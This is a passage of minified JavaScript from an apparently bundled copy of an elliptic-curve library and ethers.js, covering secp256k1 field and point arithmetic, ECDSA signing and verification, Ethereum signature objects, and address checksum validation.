zje(t)}const Vje=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function Wje(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=Vje.reduce((r,i)=>(r[i]="function",r),e);return IA(t,n)}function Gje(t,e,n){if(n<rs)throw new Error("Expected power > 0");if(n===rs)return t.ONE;if(n===wi)return e;let r=t.ONE,i=e;for(;n>rs;)n&wi&&(r=t.mul(r,i)),i=t.sqr(i),n>>=wi;return r}function Kje(t,e){const n=new Array(e.length),r=e.reduce((s,o,a)=>t.is0(o)?s:(n[a]=s,t.mul(s,o)),t.ONE),i=t.inv(r);return e.reduceRight((s,o,a)=>t.is0(o)?s:(n[a]=t.mul(s,n[a]),t.mul(s,o)),i),n}function Vce(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function Zje(t,e,n=!1,r={}){if(t<=rs)throw new Error(`Expected Field ORDER > 0, got ${t}`);const{nBitLength:i,nByteLength:s}=Vce(t,e);if(s>2048)throw new Error("Field lengths over 2048 bytes are not supported");const o=qje(t),a=Object.freeze({ORDER:t,BITS:i,BYTES:s,MASK:Aj(i),ZERO:rs,ONE:wi,create:c=>Qo(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error(`Invalid field element: expected bigint, got ${typeof c}`);return rs<=c&&c<t},is0:c=>c===rs,isOdd:c=>(c&wi)===wi,neg:c=>Qo(-c,t),eql:(c,l)=>c===l,sqr:c=>Qo(c*c,t),add:(c,l)=>Qo(c+l,t),sub:(c,l)=>Qo(c-l,t),mul:(c,l)=>Qo(c*l,t),pow:(c,l)=>Gje(a,c,l),div:(c,l)=>Qo(c*lD(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>lD(c,t),sqrt:r.sqrt||(c=>o(a,c)),invertBatch:c=>Kje(a,c),cmov:(c,l,f)=>f?l:c,toBytes:c=>n?_j(c,s):z1(c,s),fromBytes:c=>{if(c.length!==s)throw new Error(`Fp.fromBytes: expected ${s}, got ${c.length}`);return n?Ej(c):Jm(c)}});return Object.freeze(a)}function Wce(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function Gce(t){const e=Wce(t);return e+Math.ceil(e/2)}function Yje(t,e,n=!1){const r=t.length,i=Wce(e),s=Gce(e);if(r<16||r<s||r>1024)throw new Error(`expected ${s}-1024 bytes of input, got ${r}`);const o=n?Jm(t):Ej(t),a=Qo(o,e-wi)+wi;return n?_j(a,i):z1(a,i)}const Qje=BigInt(0),CO=BigInt(1);function Jje(t,e){const n=(i,s)=>{const o=s.negate();return i?o:s},r=i=>{const s=Math.ceil(e/i)+1,o=2**(i-1);return{windows:s,windowSize:o}};return{constTimeNegate:n,unsafeLadder(i,s){let o=t.ZERO,a=i;for(;s>Qje;)s&CO&&(o=o.add(a)),a=a.double(),s>>=CO;return o},precomputeWindow(i,s){const{windows:o,windowSize:a}=r(s),c=[];let l=i,f=l;for(let h=0;h<o;h++){f=l,c.push(f);for(let m=1;m<a;m++)f=f.add(l),c.push(f);l=f.double()}return c},wNAF(i,s,o){const{windows:a,windowSize:c}=r(i);let l=t.ZERO,f=t.BASE;const h=BigInt(2**i-1),m=2**i,b=BigInt(i);for(let w=0;w<a;w++){const y=w*c;let E=Number(o&h);o>>=b,E>c&&(E-=m,o+=CO);const A=y,R=y+Math.abs(E)-1,S=w%2!==0,v=E<0;E===0?f=f.add(n(S,s[A])):l=l.add(n(v,s[R]))}return{p:l,f}},wNAFCached(i,s,o,a){const c=i._WINDOW_SIZE||1;let l=s.get(i);return l||(l=this.precomputeWindow(i,c),c!==1&&s.set(i,a(l))),this.wNAF(c,l,o)}}}function Kce(t){return Wje(t.Fp),IA(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...Vce(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}function Xje(t){const e=Kce(t);IA(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:eMe,hexToBytes:tMe}=Fje,zm={Err:class extends Error{constructor(e=""){super(e)}},_parseInt(t){const{Err:e}=zm;if(t.length<2||t[0]!==2)throw new e("Invalid signature integer tag");const n=t[1],r=t.subarray(2,n+2);if(!n||r.length!==n)throw new e("Invalid signature integer: wrong length");if(r[0]&128)throw new e("Invalid signature integer: negative");if(r[0]===0&&!(r[1]&128))throw new e("Invalid signature integer: unnecessary leading zero");return{d:eMe(r),l:t.subarray(n+2)}},toSig(t){const{Err:e}=zm,n=typeof t=="string"?tMe(t):t;if(!(n instanceof Uint8Array))throw new Error("ui8a expected");let r=n.length;if(r<2||n[0]!=48)throw new e("Invalid signature tag");if(n[1]!==r-2)throw new e("Invalid signature: incorrect length");const{d:i,l:s}=zm._parseInt(n.subarray(2)),{d:o,l:a}=zm._parseInt(s);if(a.length)throw new e("Invalid signature: left bytes after parsing");return{r:i,s:o}},hexFromSig(t){const e=l=>Number.parseInt(l[0],16)&8?"00"+l:l,n=l=>{const f=l.toString(16);return f.length&1?`0${f}`:f},r=e(n(t.s)),i=e(n(t.r)),s=r.length/2,o=i.length/2,a=n(s),c=n(o);return`30${n(o+s+4)}02${c}${i}02${a}${r}`}},gf=BigInt(0),Oc=BigInt(1);BigInt(2);const fG=BigInt(3);BigInt(4);function nMe(t){const e=Xje(t),{Fp:n}=e,r=e.toBytes||((w,y,E)=>{const A=y.toAffine();return T_(Uint8Array.from([4]),n.toBytes(A.x),n.toBytes(A.y))}),i=e.fromBytes||(w=>{const y=w.subarray(1),E=n.fromBytes(y.subarray(0,n.BYTES)),A=n.fromBytes(y.subarray(n.BYTES,2*n.BYTES));return{x:E,y:A}});function s(w){const{a:y,b:E}=e,A=n.sqr(w),R=n.mul(A,w);return n.add(n.add(R,n.mul(w,y)),E)}if(!n.eql(n.sqr(e.Gy),s(e.Gx)))throw new Error("bad generator point: equation left != right");function o(w){return typeof w=="bigint"&&gf<w&&w<e.n}function a(w){if(!o(w))throw new Error("Expected valid bigint: 0 < bigint < curve.n")}function c(w){const{allowedPrivateKeyLengths:y,nByteLength:E,wrapPrivateKey:A,n:R}=e;if(y&&typeof w!="bigint"){if(w instanceof Uint8Array&&(w=$1(w)),typeof w!="string"||!y.includes(w.length))throw new Error("Invalid key");w=w.padStart(E*2,"0")}let S;try{S=typeof w=="bigint"?w:Jm(Tu("private key",w,E))}catch{throw new Error(`private key must be ${E} bytes, hex or bigint, not ${typeof w}`)}return A&&(S=Qo(S,R)),a(S),S}const l=new Map;function f(w){if(!(w instanceof h))throw new Error("ProjectivePoint expected")}class h{constructor(y,E,A){if(this.px=y,this.py=E,this.pz=A,y==null||!n.isValid(y))throw new Error("x required");if(E==null||!n.isValid(E))throw new Error("y required");if(A==null||!n.isValid(A))throw new Error("z required")}static fromAffine(y){const{x:E,y:A}=y||{};if(!y||!n.isValid(E)||!n.isValid(A))throw new Error("invalid affine point");if(y instanceof h)throw new Error("projective point not allowed");const R=S=>n.eql(S,n.ZERO);return R(E)&&R(A)?h.ZERO:new h(E,A,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(y){const E=n.invertBatch(y.map(A=>A.pz));return y.map((A,R)=>A.toAffine(E[R])).map(h.fromAffine)}static fromHex(y){const E=h.fromAffine(i(Tu("pointHex",y)));return E.assertValidity(),E}static fromPrivateKey(y){return h.BASE.multiply(c(y))}_setWindowSize(y){this._WINDOW_SIZE=y,l.delete(this)}assertValidity(){if(this.is0()){if(e.allowInfinityPoint&&!n.is0(this.py))return;throw new Error("bad point: ZERO")}const{x:y,y:E}=this.toAffine();if(!n.isValid(y)||!n.isValid(E))throw new Error("bad point: x or y not FE");const A=n.sqr(E),R=s(y);if(!n.eql(A,R))throw new Error("bad point: equation left != right");if(!this.isTorsionFree())throw new Error("bad point: not in prime-order subgroup")}hasEvenY(){const{y}=this.toAffine();if(n.isOdd)return!n.isOdd(y);throw new Error("Field doesn't support isOdd")}equals(y){f(y);const{px:E,py:A,pz:R}=this,{px:S,py:v,pz:k}=y,O=n.eql(n.mul(E,k),n.mul(S,R)),_=n.eql(n.mul(A,k),n.mul(v,R));return O&&_}negate(){return new h(this.px,n.neg(this.py),this.pz)}double(){const{a:y,b:E}=e,A=n.mul(E,fG),{px:R,py:S,pz:v}=this;let k=n.ZERO,O=n.ZERO,_=n.ZERO,I=n.mul(R,R),T=n.mul(S,S),B=n.mul(v,v),U=n.mul(R,S);return U=n.add(U,U),_=n.mul(R,v),_=n.add(_,_),k=n.mul(y,_),O=n.mul(A,B),O=n.add(k,O),k=n.sub(T,O),O=n.add(T,O),O=n.mul(k,O),k=n.mul(U,k),_=n.mul(A,_),B=n.mul(y,B),U=n.sub(I,B),U=n.mul(y,U),U=n.add(U,_),_=n.add(I,I),I=n.add(_,I),I=n.add(I,B),I=n.mul(I,U),O=n.add(O,I),B=n.mul(S,v),B=n.add(B,B),I=n.mul(B,U),k=n.sub(k,I),_=n.mul(B,T),_=n.add(_,_),_=n.add(_,_),new h(k,O,_)}add(y){f(y);const{px:E,py:A,pz:R}=this,{px:S,py:v,pz:k}=y;let O=n.ZERO,_=n.ZERO,I=n.ZERO;const T=e.a,B=n.mul(e.b,fG);let U=n.mul(E,S),M=n.mul(A,v),N=n.mul(R,k),q=n.add(E,A),P=n.add(S,v);q=n.mul(q,P),P=n.add(U,M),q=n.sub(q,P),P=n.add(E,R);let C=n.add(S,k);return P=n.mul(P,C),C=n.add(U,N),P=n.sub(P,C),C=n.add(A,R),O=n.add(v,k),C=n.mul(C,O),O=n.add(M,N),C=n.sub(C,O),I=n.mul(T,P),O=n.mul(B,N),I=n.add(O,I),O=n.sub(M,I),I=n.add(M,I),_=n.mul(O,I),M=n.add(U,U),M=n.add(M,U),N=n.mul(T,N),P=n.mul(B,P),M=n.add(M,N),N=n.sub(U,N),N=n.mul(T,N),P=n.add(P,N),U=n.mul(M,P),_=n.add(_,U),U=n.mul(C,P),O=n.mul(q,O),O=n.sub(O,U),U=n.mul(q,M),I=n.mul(C,I),I=n.add(I,U),new h(O,_,I)}subtract(y){return this.add(y.negate())}is0(){return this.equals(h.ZERO)}wNAF(y){return b.wNAFCached(this,l,y,E=>{const A=n.invertBatch(E.map(R=>R.pz));return E.map((R,S)=>R.toAffine(A[S])).map(h.fromAffine)})}multiplyUnsafe(y){const E=h.ZERO;if(y===gf)return E;if(a(y),y===Oc)return this;const{endo:A}=e;if(!A)return b.unsafeLadder(this,y);let{k1neg:R,k1:S,k2neg:v,k2:k}=A.splitScalar(y),O=E,_=E,I=this;for(;S>gf||k>gf;)S&Oc&&(O=O.add(I)),k&Oc&&(_=_.add(I)),I=I.double(),S>>=Oc,k>>=Oc;return R&&(O=O.negate()),v&&(_=_.negate()),_=new h(n.mul(_.px,A.beta),_.py,_.pz),O.add(_)}multiply(y){a(y);let E=y,A,R;const{endo:S}=e;if(S){const{k1neg:v,k1:k,k2neg:O,k2:_}=S.splitScalar(E);let{p:I,f:T}=this.wNAF(k),{p:B,f:U}=this.wNAF(_);I=b.constTimeNegate(v,I),B=b.constTimeNegate(O,B),B=new h(n.mul(B.px,S.beta),B.py,B.pz),A=I.add(B),R=T.add(U)}else{const{p:v,f:k}=this.wNAF(E);A=v,R=k}return h.normalizeZ([A,R])[0]}multiplyAndAddUnsafe(y,E,A){const R=h.BASE,S=(k,O)=>O===gf||O===Oc||!k.equals(R)?k.multiplyUnsafe(O):k.multiply(O),v=S(this,E).add(S(y,A));return v.is0()?void 0:v}toAffine(y){const{px:E,py:A,pz:R}=this,S=this.is0();y==null&&(y=S?n.ONE:n.inv(R));const v=n.mul(E,y),k=n.mul(A,y),O=n.mul(R,y);if(S)return{x:n.ZERO,y:n.ZERO};if(!n.eql(O,n.ONE))throw new Error("invZ was invalid");return{x:v,y:k}}isTorsionFree(){const{h:y,isTorsionFree:E}=e;if(y===Oc)return!0;if(E)return E(h,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:y,clearCofactor:E}=e;return y===Oc?this:E?E(h,this):this.multiplyUnsafe(e.h)}toRawBytes(y=!0){return this.assertValidity(),r(h,this,y)}toHex(y=!0){return $1(this.toRawBytes(y))}}h.BASE=new h(e.Gx,e.Gy,n.ONE),h.ZERO=new h(n.ZERO,n.ONE,n.ZERO);const m=e.nBitLength,b=Jje(h,e.endo?Math.ceil(m/2):m);return{CURVE:e,ProjectivePoint:h,normPrivateKeyToScalar:c,weierstrassEquation:s,isWithinCurveOrder:o}}function rMe(t){const e=Kce(t);return IA(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function iMe(t){const e=rMe(t),{Fp:n,n:r}=e,i=n.BYTES+1,s=2*n.BYTES+1;function o(P){return gf<P&&P<n.ORDER}function a(P){return Qo(P,r)}function c(P){return lD(P,r)}const{ProjectivePoint:l,normPrivateKeyToScalar:f,weierstrassEquation:h,isWithinCurveOrder:m}=nMe({...e,toBytes(P,C,j){const z=C.toAffine(),$=n.toBytes(z.x),H=T_;return j?H(Uint8Array.from([C.hasEvenY()?2:3]),$):H(Uint8Array.from([4]),$,n.toBytes(z.y))},fromBytes(P){const C=P.length,j=P[0],z=P.subarray(1);if(C===i&&(j===2||j===3)){const $=Jm(z);if(!o($))throw new Error("Point is not on curve");const H=h($);let L=n.sqrt(H);const V=(L&Oc)===Oc;return(j&1)===1!==V&&(L=n.neg(L)),{x:$,y:L}}else if(C===s&&j===4){const $=n.fromBytes(z.subarray(0,n.BYTES)),H=n.fromBytes(z.subarray(n.BYTES,2*n.BYTES));return{x:$,y:H}}else throw new Error(`Point of length ${C} was invalid. Expected ${i} compressed bytes or ${s} uncompressed bytes`)}}),b=P=>$1(z1(P,e.nByteLength));function w(P){const C=r>>Oc;return P>C}function y(P){return w(P)?a(-P):P}const E=(P,C,j)=>Jm(P.slice(C,j));class A{constructor(C,j,z){this.r=C,this.s=j,this.recovery=z,this.assertValidity()}static fromCompact(C){const j=e.nByteLength;return C=Tu("compactSignature",C,j*2),new A(E(C,0,j),E(C,j,2*j))}static fromDER(C){const{r:j,s:z}=zm.toSig(Tu("DER",C));return new A(j,z)}assertValidity(){if(!m(this.r))throw new Error("r must be 0 < r < CURVE.n");if(!m(this.s))throw new Error("s must be 0 < s < CURVE.n")}addRecoveryBit(C){return new A(this.r,this.s,C)}recoverPublicKey(C){const{r:j,s:z,recovery:$}=this,H=_(Tu("msgHash",C));if($==null||![0,1,2,3].includes($))throw new Error("recovery id invalid");const L=$===2||$===3?j+e.n:j;if(L>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const V=($&1)===0?"02":"03",G=l.fromHex(V+b(L)),Z=c(L),J=a(-H*Z),ne=a(z*Z),re=l.BASE.multiplyAndAddUnsafe(G,J,ne);if(!re)throw new Error("point at infinify");return re.assertValidity(),re}hasHighS(){return w(this.s)}normalizeS(){return this.hasHighS()?new A(this.r,a(-this.s),this.recovery):this}toDERRawBytes(){return H1(this.toDERHex())}toDERHex(){return zm.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return H1(this.toCompactHex())}toCompactHex(){return b(this.r)+b(this.s)}}const R={isValidPrivateKey(P){try{return f(P),!0}catch{return!1}},normPrivateKeyToScalar:f,randomPrivateKey:()=>{const P=Gce(e.n);return Yje(e.randomBytes(P),e.n)},precompute(P=8,C=l.BASE){return C._setWindowSize(P),C.multiply(BigInt(3)),C}};function S(P,C=!0){return l.fromPrivateKey(P).toRawBytes(C)}function v(P){const C=P instanceof Uint8Array,j=typeof P=="string",z=(C||j)&&P.length;return C?z===i||z===s:j?z===2*i||z===2*s:P instanceof l}function k(P,C,j=!0){if(v(P))throw new Error("first arg must be private key");if(!v(C))throw new Error("second arg must be public key");return l.fromHex(C).multiply(f(P)).toRawBytes(j)}const O=e.bits2int||function(P){const C=Jm(P),j=P.length*8-e.nBitLength;return j>0?C>>BigInt(j):C},_=e.bits2int_modN||function(P){return a(O(P))},I=Aj(e.nBitLength);function T(P){if(typeof P!="bigint")throw new Error("bigint expected");if(!(gf<=P&&P<I))throw new Error(`bigint expected < 2^${e.nBitLength}`);return z1(P,e.nByteLength)}function B(P,C,j=U){if(["recovered","canonical"].some(oe=>oe in j))throw new Error("sign() legacy options not supported");const{hash:z,randomBytes:$}=e;let{lowS:H,prehash:L,extraEntropy:V}=j;H==null&&(H=!0),P=Tu("msgHash",P),L&&(P=Tu("prehashed msgHash",z(P)));const G=_(P),Z=f(C),J=[T(Z),T(G)];if(V!=null){const oe=V===!0?$(n.BYTES):V;J.push(Tu("extraEntropy",oe))}const ne=T_(...J),re=G;function le(oe){const ue=O(oe);if(!m(ue))return;const be=c(ue),Me=l.BASE.multiply(ue).toAffine(),Te=a(Me.x);if(Te===gf)return;const Oe=a(be*a(re+Te*Z));if(Oe===gf)return;let Ke=(Me.x===Te?0:2)|Number(Me.y&Oc),it=Oe;return H&&w(Oe)&&(it=y(Oe),Ke^=1),new A(Te,it,Ke)}return{seed:ne,k2sig:le}}const U={lowS:e.lowS,prehash:!1},M={lowS:e.lowS,prehash:!1};function N(P,C,j=U){const{seed:z,k2sig:$}=B(P,C,j),H=e;return qce(H.hash.outputLen,H.nByteLength,H.hmac)(z,$)}l.BASE._setWindowSize(8);function q(P,C,j,z=M){const $=P;if(C=Tu("msgHash",C),j=Tu("publicKey",j),"strict"in z)throw new Error("options.strict was renamed to lowS");const{lowS:H,prehash:L}=z;let V,G;try{if(typeof $=="string"||$ instanceof Uint8Array)try{V=A.fromDER($)}catch(Me){if(!(Me instanceof zm.Err))throw Me;V=A.fromCompact($)}else if(typeof $=="object"&&typeof $.r=="bigint"&&typeof $.s=="bigint"){const{r:Me,s:Te}=$;V=new A(Me,Te)}else throw new Error("PARSE");G=l.fromHex(j)}catch(Me){if(Me.message==="PARSE")throw new Error("signature must be Signature instance, Uint8Array or hex string");return!1}if(H&&V.hasHighS())return!1;L&&(C=e.hash(C));const{r:Z,s:J}=V,ne=_(C),re=c(J),le=a(ne*re),oe=a(Z*re),ue=l.BASE.multiplyAndAddUnsafe(G,le,oe)?.toAffine();return ue?a(ue.x)===Z:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:k,sign:N,verify:q,ProjectivePoint:l,Signature:A,utils:R}}function sMe(t){return{hash:t,hmac:(e,...n)=>Cce(t,e,WBe(...n)),randomBytes:GBe}}function oMe(t,e){const n=r=>iMe({...t,...sMe(r)});return Object.freeze({...n(e),create:n})}const Zce=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),hG=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),aMe=BigInt(1),dD=BigInt(2),pG=(t,e)=>(t+e/dD)/e;function cMe(t){const e=Zce,n=BigInt(3),r=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=t*t*t%e,f=l*l*t%e,h=Sc(f,n,e)*f%e,m=Sc(h,n,e)*f%e,b=Sc(m,dD,e)*l%e,w=Sc(b,i,e)*b%e,y=Sc(w,s,e)*w%e,E=Sc(y,a,e)*y%e,A=Sc(E,c,e)*E%e,R=Sc(A,a,e)*y%e,S=Sc(R,n,e)*f%e,v=Sc(S,o,e)*w%e,k=Sc(v,r,e)*l%e,O=Sc(k,dD,e);if(!fD.eql(fD.sqr(O),t))throw new Error("Cannot find square root");return O}const fD=Zje(Zce,void 0,void 0,{sqrt:cMe}),op=oMe({a:BigInt(0),b:BigInt(7),Fp:fD,n:hG,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=hG,n=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-aMe*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=n,o=BigInt("0x100000000000000000000000000000000"),a=pG(s*t,e),c=pG(-r*t,e);let l=Qo(t-a*n-c*i,e),f=Qo(-a*r-c*s,e);const h=l>o,m=f>o;if(h&&(l=e-l),m&&(f=e-f),l>o||f>o)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:h,k1:l,k2neg:m,k2:f}}}},Tce);BigInt(0);op.ProjectivePoint;const x_="0x0000000000000000000000000000000000000000",mG="0x0000000000000000000000000000000000000000000000000000000000000000",gG=BigInt(0),yG=BigInt(1),hD=BigInt(2),bG=BigInt(27),wG=BigInt(28),u6=BigInt(35),Yce=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),uMe=Yce/hD,lMe=Symbol.for("nodejs.util.inspect.custom"),em={};function SO(t){return Ff(Di(t),32)}let Lc=class _u{#e;#t;#n;#r;get r(){return this.#e}set r(e){pe(o1(e)===32,"invalid r","value",e),this.#e=rt(e)}get s(){return pe(parseInt(this.#t.substring(0,3))<8,"non-canonical s; use ._s","s",this.#t),this.#t}set s(e){pe(o1(e)===32,"invalid s","value",e),this.#t=rt(e)}get _s(){return this.#t}isValid(){return BigInt(this.#t)<=uMe}get v(){return this.#n}set v(e){const n=Qt(e,"value");pe(n===27||n===28,"invalid v","v",e),this.#n=n}get networkV(){return this.#r}get legacyChainId(){const e=this.networkV;return e==null?null:_u.getChainId(e)}get yParity(){return this.v===27?0:1}get yParityAndS(){const e=an(this.s);return this.yParity&&(e[0]|=128),rt(e)}get compactSerialized(){return Lr([this.r,this.yParityAndS])}get serialized(){return Lr([this.r,this.s,this.yParity?"0x1c":"0x1b"])}constructor(e,n,r,i){SA(e,em,"Signature"),this.#e=n,this.#t=r,this.#n=i,this.#r=null}getCanonical(){if(this.isValid())return this;const e=Yce-BigInt(this._s),n=55-this.v,r=new _u(em,this.r,SO(e),n);return this.networkV&&(r.#r=this.networkV),r}clone(){const e=new _u(em,this.r,this._s,this.v);return this.networkV&&(e.#r=this.networkV),e}toJSON(){const e=this.networkV;return{_type:"signature",networkV:e!=null?e.toString():null,r:this.r,s:this._s,v:this.v}}[lMe](){return this.toString()}toString(){return this.isValid()?`Signature { r: ${this.r}, s: ${this._s}, v: ${this.v} }`:`Signature { r: ${this.r}, s: ${this._s}, v: ${this.v}, valid: false }`}static getChainId(e){const n=wt(e,"v");return n==bG||n==wG?gG:(pe(n>=u6,"invalid EIP-155 v","v",e),(n-u6)/hD)}static getChainIdV(e,n){return wt(e)*hD+BigInt(35+n-27)}static getNormalizedV(e){const n=wt(e);return n===gG||n===bG?27:n===yG||n===wG?28:(pe(n>=u6,"invalid v","v",e),n&yG?27:28)}static from(e){function n(l,f){pe(l,f,"signature",e)}if(e==null)return new _u(em,mG,mG,27);if(typeof e=="string"){const l=an(e,"signature");if(l.length===64){const f=rt(l.slice(0,32)),h=l.slice(32,64),m=h[0]&128?28:27;return h[0]&=127,new _u(em,f,rt(h),m)}if(l.length===65){const f=rt(l.slice(0,32)),h=rt(l.slice(32,64)),m=_u.getNormalizedV(l[64]);return new _u(em,f,h,m)}n(!1,"invalid raw signature length")}if(e instanceof _u)return e.clone();const r=e.r;n(r!=null,"missing r");const i=SO(r),s=(function(l,f){if(l!=null)return SO(l);if(f!=null){n(gr(f,32),"invalid yParityAndS");const h=an(f);return h[0]&=127,rt(h)}n(!1,"missing s")})(e.s,e.yParityAndS),{networkV:o,v:a}=(function(l,f,h){if(l!=null){const m=wt(l);return{networkV:m>=u6?m:void 0,v:_u.getNormalizedV(m)}}if(f!=null)return n(gr(f,32),"invalid yParityAndS"),{v:an(f)[0]&128?28:27};if(h!=null){switch(Qt(h,"sig.yParity")){case 0:return{v:27};case 1:return{v:28}}n(!1,"invalid yParity")}n(!1,"missing v")})(e.v,e.yParityAndS,e.yParity),c=new _u(em,i,s,a);return o&&(c.#r=o),n(e.yParity==null||Qt(e.yParity,"sig.yParity")===c.yParity,"yParity mismatch"),n(e.yParityAndS==null||e.yParityAndS===c.yParityAndS,"yParityAndS mismatch"),c}};class yf{#e;constructor(e){pe(o1(e)===32,"invalid private key","privateKey","[REDACTED]"),this.#e=rt(e)}get privateKey(){return this.#e}get publicKey(){return yf.computePublicKey(this.#e)}get compressedPublicKey(){return yf.computePublicKey(this.#e,!0)}sign(e){pe(o1(e)===32,"invalid digest length","digest",e);const n=op.sign(po(e),po(this.#e),{lowS:!0});return Lc.from({r:Lp(n.r,32),s:Lp(n.s,32),v:n.recovery?28:27})}computeSharedSecret(e){const n=yf.computePublicKey(e);return rt(op.getSharedSecret(po(this.#e),an(n),!1))}static computePublicKey(e,n){let r=an(e,"key");if(r.length===32){const s=op.getPublicKey(r,!!n);return rt(s)}if(r.length===64){const s=new Uint8Array(65);s[0]=4,s.set(r,1),r=s}const i=op.ProjectivePoint.fromHex(r);return rt(i.toRawBytes(n))}static recoverPublicKey(e,n){pe(o1(e)===32,"invalid digest length","digest",e);const r=Lc.from(n);let i=op.Signature.fromCompact(po(Lr([r.r,r.s])));i=i.addRecoveryBit(r.yParity);const s=i.recoverPublicKey(po(e));return pe(s!=null,"invalid signature for digest","signature",n),"0x"+s.toHex(!1)}static addPoints(e,n,r){const i=op.ProjectivePoint.fromHex(yf.computePublicKey(e).substring(2)),s=op.ProjectivePoint.fromHex(yf.computePublicKey(n).substring(2));return"0x"+i.add(s).toHex(!!r)}}const dMe=BigInt(0),fMe=BigInt(36);function vG(t){t=t.toLowerCase();const e=t.substring(2).split(""),n=new Uint8Array(40);for(let i=0;i<40;i++)n[i]=e[i].charCodeAt(0);const r=an(Oi(n));for(let i=0;i<40;i+=2)r[i>>1]>>4>=8&&(e[i]=e[i].toUpperCase()),(r[i>>1]&15)>=8&&(e[i+1]=e[i+1].toUpperCase());return"0x"+e.join("")}const Cj={};for(let t=0;t<10;t++)Cj[String(t)]=String(t);for(let t=0;t<26;t++)Cj[String.fromCharCode(65+t)]=String(10+t);const EG=15;function hMe(t){t=t.toUpperCase(),t=t.substring(4)+t.substring(0,2)+"00";let e=t.split("").map(r=>Cj[r]).join("");for(;e.length>=EG;){let r=e.substring(0,EG);e=parseInt(r,10)%97+e.substring(r.length)}let n=String(98-parseInt(e,10)%97);for(;n.length<2;)n="0"+n;return n}const pMe=(function(){const t={};for(let e=0;e<36;e++){const n="0123456789abcdefghijklmnopqrstuvwxyz"[e];t[n]=BigInt(e)}return t})();function mMe(t){t=t.toLowerCase();let e=dMe;for(let n=0;n<t.length;n++)e=e*fMe+pMe[t[n]];return e}function Vn(t){if(pe(typeof t=="string","invalid address","address",t),t.match(/^(0x)?[0-9a-fA-F]{40}$/)){t.startsWith("0x")||(t="0x"+t);const e=vG(t);return pe(!t.match(/([A-F].*[a-f])|([a-f].*[A-F])/)||e===t,"bad address checksum","address",t),e}if(t.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)){pe(t.substring(2,4)===hMe(t),"bad icap checksum","address",t);let e=mMe(t.substring(4)).toString(16);for(;e.length<40;)e="0"+e;return vG("0x"+e)}pe(!1,"invalid address","address",t)}function gMe(t){const e=Vn(t.from);let r=wt(t.nonce,"tx.nonce").toString(16);return r==="0"?r="0x":r.length%2?r="0x0"+r:r="0x"+r,Vn(si(Oi(Sf([e,r])),12))}function Qce(t){return t&&typeof t.getAddress=="function"}async function TO(t,e){const n=await e;return(n==null||n==="0x0000000000000000000000000000000000000000")&&(qe(typeof t!="string","unconfigured name","UNCONFIGURED_NAME",{value:t}),pe(!1,"invalid AddressLike value; did not resolve to a value address","target",t)),Vn(n)}function go(t,e){if(typeof t=="string")return t.match(/^0x[0-9a-f]{40}$/i)?Vn(t):(qe(e!=null,"ENS resolution requires a provider","UNSUPPORTED_OPERATION",{operation:"resolveName"}),TO(t,e.resolveName(t)));if(Qce(t))return TO(t,t.getAddress());if(t&&typeof t.then=="function")return TO(t,t);pe(!1,"unsupported addressable value","target",t)}const lf={};function yt(t,e){let n=!1;return e<0&&(n=!0,e*=-1),new ai(lf,`${n?"":"u"}int${e}`,t,{signed:n,width:e})}function Mn(t,e){return new ai(lf,`bytes${e||""}`,t,{size:e})}const _G=Symbol.for("_ethers_typed");class ai{type;value;#e;_typedSymbol;constructor(e,n,r,i){i==null&&(i=null),SA(lf,e,"Typed"),Lt(this,{_typedSymbol:_G,type:n,value:r}),this.#e=i,this.format()}format(){if(this.type==="array")throw new Error("");if(this.type==="dynamicArray")throw new Error("");return this.type==="tuple"?`tuple(${this.value.map(e=>e.format()).join(",")})`:this.type}defaultValue(){return 0}minValue(){return 0}maxValue(){return 0}isBigInt(){return!!this.type.match(/^u?int[0-9]+$/)}isData(){return this.type.startsWith("bytes")}isString(){return this.type==="string"}get tupleName(){if(this.type!=="tuple")throw TypeError("not a tuple");return this.#e}get arrayLength(){if(this.type!=="array")throw TypeError("not an array");return this.#e===!0?-1:this.#e===!1?this.value.length:null}static 